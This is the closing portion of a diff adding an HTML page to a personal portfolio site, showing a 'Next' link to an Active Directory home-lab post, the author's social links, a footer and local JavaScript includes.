+                           Active Directory in Home Lab(Part 1): Windows Server Setup
+                           <a class="custom-next-button" href="home-lab-active-directory-part-1.html">Next</a>
+                        </div>
+                     </div>
+                  </article>
+               </div>
+               <div>
+                  <h6 style="font-size: 16px;">
+                     Thank you for taking the time to read this. I can be reached on 
+                     <div class="pill-tab-end">
+                        <a href="https://www.twitter.com/ajith_kmr" class="pill-link-end"><i class="bx bxl-twitter"></i> twitter</a>
+                     </div>
+                     <div class="pill-tab-end">
+                        <a href="https://www.linkedin.com/in/ajithchandranr/" class="pill-link-end"><i class="bx bxl-linkedin"></i> LinkedIn</a>
+                     </div>
+                  </h6>
+               </div>
+            </div>
+            </div>
+         </section>
+         <!-- End Portfolio Details Section -->
+      </main>
+      <!-- End #main -->
+      <!-- ======= Footer ======= -->
+      <footer id="footer">
+         <div class="container">
+            <div class="copyright"> By <strong><span>Ajith Chandran</span></strong>
+            </div>
+            <div class="credits"> Copyright © 2023 </div>
+         </div>
+      </footer>
+      <!-- End  Footer -->
+      <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+      <!-- Vendor JS Files -->
+      <script src="../assets/vendor/purecounter/purecounter_vanilla.js"></script>
+      <script src="../assets/vendor/aos/aos.js"></script>
+      <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+      <script src="../assets/vendor/glightbox/js/glightbox.min.js"></script>
+      <script src="../assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+      <script src="../assets/vendor/swiper/swiper-bundle.min.js"></script>
+      <script src="../assets/vendor/typed.js/typed.min.js"></script>
+      <script src="../assets/vendor/waypoints/noframework.waypoints.js"></script>
+      <script src="../assets/vendor/php-email-form/validate.js"></script>
+      <!-- Template Main JS File -->
+      <script src="../assets/js/main.js"></script>
+   </body>
+</html>
